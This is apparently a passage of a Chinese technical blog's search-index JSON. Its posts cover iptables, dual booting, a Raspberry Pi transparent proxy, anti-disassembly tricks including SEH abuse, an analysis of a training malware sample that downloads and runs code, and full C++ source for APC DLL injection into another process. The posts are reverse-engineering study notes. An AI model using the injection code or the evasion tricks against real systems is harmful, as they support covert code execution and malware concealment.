-m multiport –dports 80,82 -j REDIRECT –to-ports 80 保存和恢复iptables规则 使用iptables-save可以保存到特定文件中 &amp;emsp;&amp;emsp;iptables-save &gt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables_save 使用iptables-restore可以恢复规则 &amp;emsp;&amp;emsp;iptables-restore&lt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables_save","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"双系统安装（win10+ubuntu）","slug":"杂学/双系统安装","date":"2017-10-15T16:00:00.000Z","updated":"2024-03-12T10:06:22.269Z","comments":true,"path":"2017/10/16/杂学/双系统安装/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E6%9D%82%E5%AD%A6/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/","excerpt":"1.我选择的 是win10加ubuntu双系统。 2.准备工作 U盘一个16g win10系统 ubuntu系统 3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。 4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。 其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。&#x2F;boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分&#x2F;，15g-20g左右，剩下的可以全部给&#x2F;home。引导驱动器选择&#x2F;boot,然后继续安装正常方式来装就好了。 4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择&#x2F;boot对应的就好了。此时重启你就会发现有两个候选操作系统了。","text":"1.我选择的 是win10加ubuntu双系统。 2.准备工作 U盘一个16g win10系统 ubuntu系统 3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。 4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。 其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。&#x2F;boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分&#x2F;，15g-20g左右，剩下的可以全部给&#x2F;home。引导驱动器选择&#x2F;boot,然后继续安装正常方式来装就好了。 4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择&#x2F;boot对应的就好了。此时重启你就会发现有两个候选操作系统了。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"树莓派透明代理","slug":"杂学/树莓派透明代理","date":"2017-10-15T16:00:00.000Z","updated":"2024-03-12T10:06:17.346Z","comments":true,"path":"2017/10/16/杂学/树莓派透明代理/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E6%9D%82%E5%AD%A6/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/","excerpt":"1.安装vim 连网之后，首先安装vim,便于后面的配置文件的编写。 sudo apt-get install vim 2.静态ip 图形界面貌似会失败，建议在配置文件里改： sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.配置路由转发： sudo vim /etc/sysctl.conf","text":"1.安装vim 连网之后，首先安装vim,便于后面的配置文件的编写。 sudo apt-get install vim 2.静态ip 图形界面貌似会失败，建议在配置文件里改： sudo vim /etc/dhcpcd.conf 填写以下内容 interface eth0 static ip_address=ip static routers=网关 static domain_name_servers=223.5.5.5 3.配置路由转发： sudo vim /etc/sysctl.conf 设置： net.ipv4.ip_forward=1 4.ssh开机自启动 &amp;emsp;&amp;emsp;ssh 连接树莓派还是很放方面的，不用每次都去接键盘之类的但是树莓派的ssh 默认是不自启动的，在&#x2F;etc&#x2F;rc.local中添加 sudo /etc/init.d/ssh start (exit 之前) 5.shadowssocks 安装 建议pip 安装 sudo pip install shadowsocks就可以了然后就是配置文件的编写 sudo mkdir &#x2F;etc&#x2F;shadowsockssudo touch &#x2F;etc&#x2F;shadowsocks&#x2F;shadowsocks.json 添加以下内容 &#123; &quot;server&quot;:&quot;127.0.0.1&quot;, &quot;server_port&quot;:ss服务器端口, &quot;local_address&quot;:&quot;0.0.0.0&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;ss密码&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot; &#125; 6.redsocks安装 git clone git@github.com:darkk/redsocks.git（克隆失败可以在其他地方下载后传过来） sudo apt-get install libevent-dev cd redsocks make 在redsocks 文件夹中有redsocks.conf.example把它复制出来，重命名为 redsocks.conf我习惯放在&#x2F;etc目录下即&#x2F;etc&#x2F;redsocks.conf然后编辑配置文件 local_ip =0.0.0.0 ; local_port = 12345; 自己定义后面iptables要用 ip = 127.0.0.1; port = 1080; 7.kcptun 加速器的安装 Kcptun的作用主要是配合SS用来做加速。 下载地址 https://github.com/xtaci/kcptun/releases/latest 选择kcptun-linux-arm 那一个下载解压 tar -zxf kcptun-linux-arm*.tar.gz选择适合你的树莓派的二进制文件我选择的是client_linux_arm7 。 创建配置文件如下： &#123; &quot;localaddr&quot;: &quot;:8888&quot;, &quot;remoteaddr&quot;: &quot;服务器ip:端口&quot;, &quot;key&quot;: &quot;very fast&quot;, &quot;crypt&quot;: &quot;aes-128&quot;, &quot;mode&quot;: &quot;fast2&quot;, &quot;mtu&quot;: 1400, &quot;sndwnd&quot;: 256, &quot;rcvwnd&quot;: 2048, &quot;datashard&quot;: 10, &quot;parityshard&quot;: 3, &quot;dscp&quot;: 46, &quot;nocomp&quot;: false &#125; 然后把client_linux_arm7放到&#x2F;usr&#x2F;local&#x2F;bin 里面运行 sudo client_linux_arm7 -c 配置文件就可以了。 8.iptabels sudo sslocal -c /etc/shadowsocks/shadowsocks.json &amp; &gt; /dev/null 2&gt;&amp;1 sudo redsocks -c /etc/redsocks/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -N REDSOCKS sudo iptables -t nat -A REDSOCKS -d 0.0.0.0 -j RETURN sudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 10.0.0.0/16 -j RETURN sudo iptables -t nat -A REDSOCKS -d 服务器IP -j RETURN sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 sudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDSOCKS 9.此时你把局域网其他电脑设置成它还是不能上网，因为存在dns 问题通过安装dnsmasq来解决 sudo apt-get install dnsmasq 配置文件在 &#x2F;etc&#x2F;dnsmasq.conf编辑配置文件取消no-resolv前面的注释加入 server=202.38.93.153 server=202.141.162.123 保存重启dnsmasq sudo service dnsmasq restart 此时不出意外的话应该是可以把局域网内的其他主机网关s设置成 树莓派的ip ,然后实现透明上网。建议dns 设置成 server=202.38.93.153 server=202.141.162.123 10 .善后工作把上述的配置加入启动项 sudo /etc/init.d/ssh start sudo client_linux_arm7 -c /home/pi/Desktop/configus.txt &amp; &gt; /dev/null 2&gt;&amp;1 sudo sslocal -c /etc/shadowsocks-libev/ss.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo redsocks -c /etc/redsocks.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo service dnsmasq restart 附加：热点配置安装hostapd sudo apt-get install hostapd 配置文件&#x2F;etc&#x2F;hostapd&#x2F;hostapd.conf interface=wlan0 hw_mode=g channel=10 auth_algs=1 wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP rsn_pairwise=CCMP wpa_passphrase=wifi密码 ssid=wifi名字 dnsmasq 配置文件&#x2F;etc&#x2F;dnsmasq.conf 中修改 interface=wlan0 dhcp-range=10.0.0.2,10.0.0.255,255.255.255.0,12h 在启动项中&#x2F;etc&#x2F;rc.local 增加： sudo ifconfig wlan0 down sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up sudo rm -rf /dev/random sudo ln -s /dev/urandom /dev/random sudo service dnsmasq restart sudo hostapd -B /etc/hostapd/hostapd.conf &amp; &gt; /dev/null 2&gt;&amp;1 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT 以及在&#x2F;etc&#x2F;iptables 中增加 sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDSOCKS 参考网址：http://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html http://www.jianshu.com/p/05d32b4e8fc0 http://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/ https://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"对抗反汇编1","slug":"逆向/对抗反汇编","date":"2017-10-15T16:00:00.000Z","updated":"2024-03-12T09:45:27.522Z","comments":true,"path":"2017/10/16/逆向/对抗反汇编/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/","excerpt":"方法总结如下：1、插入流氓字节，阻止真正的指令被反汇编线性反汇编和面向代码流的反汇编： 线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如： .text:00401035 jz short near ptr loc_401037+1 .text:00401037 .text:00401037 loc_401037: ; CODE XREF: .text:00401035\u0018j .text:00401037 call near ptr 8B4C55C7h 观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察 .text:00401035 jz short loc_401038 .text:00401035 ; ————————————————————————— .text:00401037 db 0E8h .text:00401038 ; ————————————————————————— .text:00401038 .text:00401038 loc_401038: ; CODE XREF: .text:00401035\u0018j .text:00401038 mov eax, [ebp+0Ch] 这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。 2、固定条件的跳转指令 xor eax, eax .text:00401035 jz short loc_401038","text":"方法总结如下：1、插入流氓字节，阻止真正的指令被反汇编线性反汇编和面向代码流的反汇编： 线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如： .text:00401035 jz short near ptr loc_401037+1 .text:00401037 .text:00401037 loc_401037: ; CODE XREF: .text:00401035\u0018j .text:00401037 call near ptr 8B4C55C7h 观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察 .text:00401035 jz short loc_401038 .text:00401035 ; ————————————————————————— .text:00401037 db 0E8h .text:00401038 ; ————————————————————————— .text:00401038 .text:00401038 loc_401038: ; CODE XREF: .text:00401035\u0018j .text:00401038 mov eax, [ebp+0Ch] 这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。 2、固定条件的跳转指令 xor eax, eax .text:00401035 jz short loc_401038 3、函数指针问题 mov [ebp+var_4],offset sub_4011c0; call [ebp+var_4] 可用IDA脚本语言IDC进行修正函数为AddCodeXref(); 4、函数未识别的问题可以按p键来强制把一段代码变成函数但是要把流氓字节nop,不然函数可能会出问题。用IDA自带的patch program来做。也可用脚本idapython 代码如下： import idaapi idaapi.CompileLine(&#39;static n_key()&#123; RunPythonStatement(&quot;nopIt()&quot;);&#125;&#39;) AddHotkey(&quot;Alt-N&quot;,&quot;n_key&quot;) def nopIt(): start=ScreenEA() end=NextHead(start) for ea in range(start,end): PatchByte(ea,0x90) Jump(end) 5、异常触发 push offset sub_4014c0 push large dword ptr fs:0 mov large fs:0,esp xor ecx,ecx div ecx 属于滥用结构化异常（SEH）来对抗反汇编，通过人为构造一些比如访问一个无效的内存区域，除0等来触发异常， SHE链是一个函数列表，处理线程的异常，列表中的函数要么处理异常，要么向下传递，如果传递到最后一个异常处理函数，就会被认为是一个不能处理的异常，弹出“an unhandled exception has occurred ”。 查找SEH链，操作系统会检查FS寄存器，这个寄存器中包含一个段选择子，从概念上来讲，链表以栈的方式工作，第一个调用的是最后一个加入链表的记录。前面的例子就是把自己的异常处理加入到链表的头部，然后用除0来触发异常，进而执行自己的代码。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"恶意代码重定向","slug":"逆向/恶意代码重定向","date":"2017-10-15T16:00:00.000Z","updated":"2024-03-12T09:45:57.960Z","comments":true,"path":"2017/10/16/逆向/恶意代码重定向/","link":"","permalink":"http://zwjsfdbb.top/2017/10/16/%E9%80%86%E5%90%91/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/","excerpt":"&amp;emsp;1.首先用strings查看字符串，发现http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\\autobat.exe，疑似编码用的字符串： /abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA， InternetReadFile InternetCloseHandle InternetOpenUrlA InternetOpenA WININET.dll URLDownloadToCacheFileA &amp;emsp;&amp;emsp;显式调用高层API COM接口，以及Wininet 接口函数。这些函数，这些都是重要信息需要关注的。 &amp;emsp;&amp;emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\\autobat.exe’,失败了调用函数，分析可知是把’http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息， 首先搜索&lt;no’字符串，然后调用401000函数， &amp;emsp;&amp;emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。 &amp;emsp;&amp;emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6&#x3D;1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。","text":"&amp;emsp;1.首先用strings查看字符串，发现http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\\autobat.exe，疑似编码用的字符串： /abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA， InternetReadFile InternetCloseHandle InternetOpenUrlA InternetOpenA WININET.dll URLDownloadToCacheFileA &amp;emsp;&amp;emsp;显式调用高层API COM接口，以及Wininet 接口函数。这些函数，这些都是重要信息需要关注的。 &amp;emsp;&amp;emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\\autobat.exe’,失败了调用函数，分析可知是把’http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息， 首先搜索&lt;no’字符串，然后调用401000函数， &amp;emsp;&amp;emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。 &amp;emsp;&amp;emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6&#x3D;1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"dll注入之APC注入","slug":"逆向/dll之APC注入","date":"2017-09-15T16:00:00.000Z","updated":"2024-03-12T09:47:33.227Z","comments":true,"path":"2017/09/16/逆向/dll之APC注入/","link":"","permalink":"http://zwjsfdbb.top/2017/09/16/%E9%80%86%E5%90%91/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/","excerpt":"APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下： 1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。程序如下: // TESTAPC2.cpp : 定义控制台应用程序的入口点。 // #include &quot;stdafx.h&quot; #include &lt;string&gt; #include&lt;windows.h&gt; #include&lt;shlwapi.h&gt; #include&lt;tlhelp32.h&gt; #include&lt;winternl.h&gt; #pragma comment(lib,&quot;shlwapi.lib&quot;) #pragma comment(lib,&quot;ntdll.lib&quot;) using namespace std; //根据进程名获取PID DWORD GetPidFormName(wstring wsProcessname) &#123; HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) &#123; return false; &#125; PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;; BOOL bok; for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe)) &#123; wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) &#123; CloseHandle(hSnaoshot); return pe.th32ProcessID; &#125; &#125; CloseHandle(hSnaoshot); return 0; &#125; //dll 文件注入到进程wsProcessname BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]) &#123; DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) &#123; return FALSE; &#125; PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) &#123; //在远程进程申请空间写入待注入dll 的路径 WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet); CloseHandle(hProcess); &#125; //开始注入 THREADENTRY32 te = &#123; sizeof(te) &#125;; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程 if (handleSnap == INVALID_HANDLE_VALUE) &#123; return false; &#125; bool bstat = false; if (Thread32First(handleSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == dwProcessId) &#123; HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); &#125; if (dwRet &gt; 0) &#123; bstat = TRUE; &#125; CloseHandle(handleThread); &#125; &#125; while (Thread32Next(handleSnap, &amp;te)); CloseHandle(handleSnap); return bstat; &#125; &#125; int main() &#123; Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;); return 0; &#125; 测试exe程序： #include&lt;windows.h&gt; int main() &#123; MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK); SleepEx(1000 * 60 * 5, true); MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK); Sleep(-1); &#125; 测试dll 程序： #include&lt;windows.h&gt; #include&quot;dll.h&quot; BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) &#123; switch (dwReason) &#123; // 动态链接库映射到某个进程的地址空间 case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK); /** * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作， * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了 **/ break; // 应用程序创建新的线程 case DLL_THREAD_ATTACH: break; // 应用程序某个线程正常终止 case DLL_THREAD_DETACH: break; // 动态链接库将被卸载 case DLL_PROCESS_DETACH: /** * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作 * 如关闭文件，释放内存空间等 **/ break; &#125; return 1; &#125; /* void helloDLL(void) &#123; //MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK); &#125;*/","text":"APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下： 1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。程序如下: // TESTAPC2.cpp : 定义控制台应用程序的入口点。 // #include &quot;stdafx.h&quot; #include &lt;string&gt; #include&lt;windows.h&gt; #include&lt;shlwapi.h&gt; #include&lt;tlhelp32.h&gt; #include&lt;winternl.h&gt; #pragma comment(lib,&quot;shlwapi.lib&quot;) #pragma comment(lib,&quot;ntdll.lib&quot;) using namespace std; //根据进程名获取PID DWORD GetPidFormName(wstring wsProcessname) &#123; HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) &#123; return false; &#125; PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;; BOOL bok; for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe)) &#123; wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) &#123; CloseHandle(hSnaoshot); return pe.th32ProcessID; &#125; &#125; CloseHandle(hSnaoshot); return 0; &#125; //dll 文件注入到进程wsProcessname BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]) &#123; DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) &#123; return FALSE; &#125; PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) &#123; //在远程进程申请空间写入待注入dll 的路径 WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet); CloseHandle(hProcess); &#125; //开始注入 THREADENTRY32 te = &#123; sizeof(te) &#125;; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程 if (handleSnap == INVALID_HANDLE_VALUE) &#123; return false; &#125; bool bstat = false; if (Thread32First(handleSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == dwProcessId) &#123; HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); &#125; if (dwRet &gt; 0) &#123; bstat = TRUE; &#125; CloseHandle(handleThread); &#125; &#125; while (Thread32Next(handleSnap, &amp;te)); CloseHandle(handleSnap); return bstat; &#125; &#125; int main() &#123; Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;); return 0; &#125; 测试exe程序： #include&lt;windows.h&gt; int main() &#123; MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK); SleepEx(1000 * 60 * 5, true); MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK); Sleep(-1); &#125; 测试dll 程序： #include&lt;windows.h&gt; #include&quot;dll.h&quot; BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) &#123; switch (dwReason) &#123; // 动态链接库映射到某个进程的地址空间 case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK); /** * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作， * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了 **/ break; // 应用程序创建新的线程 case DLL_THREAD_ATTACH: break; // 应用程序某个线程正常终止 case DLL_THREAD_DETACH: break; // 动态链接库将被卸载 case DLL_PROCESS_DETACH: /** * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作 * 如关闭文件，释放内存空间等 **/ break; &#125; return 1; &#125; /* void helloDLL(void) &#123; //MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK); &#125;*/","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"VS错误集","slug":"编程/vs错误集","date":"2017-09-13T16:00:00.000Z","updated":"2024-03-12T11:13:20.053Z","comments":true,"path":"2017/09/14/编程/vs错误集/","link":"","permalink":"http://zwjsfdbb.top/2017/09/14/%E7%BC%96%E7%A8%8B/vs%E9%94%99%E8%AF%AF%E9%9B%86/","excerpt":"一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window F:\\c\\window\\window\\MSVCRTD.lib(exe_main.obj) &amp;emsp;&amp;emsp;原因是c语言程序找不到适当的入口程序函数 般情况下， &amp;emsp;&amp;emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目” &amp;emsp;&amp;emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求 &amp;emsp;&amp;emsp;如果是windows程序： 1.菜单中选择 工程-&gt;属性, 弹出属性窗口 2.在左边栏中依次选择：配置属性-&gt;C&#x2F;C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS. 3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(&#x2F;SUBSYSTEM:WINDOWS)如果是控制台程序： 1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口 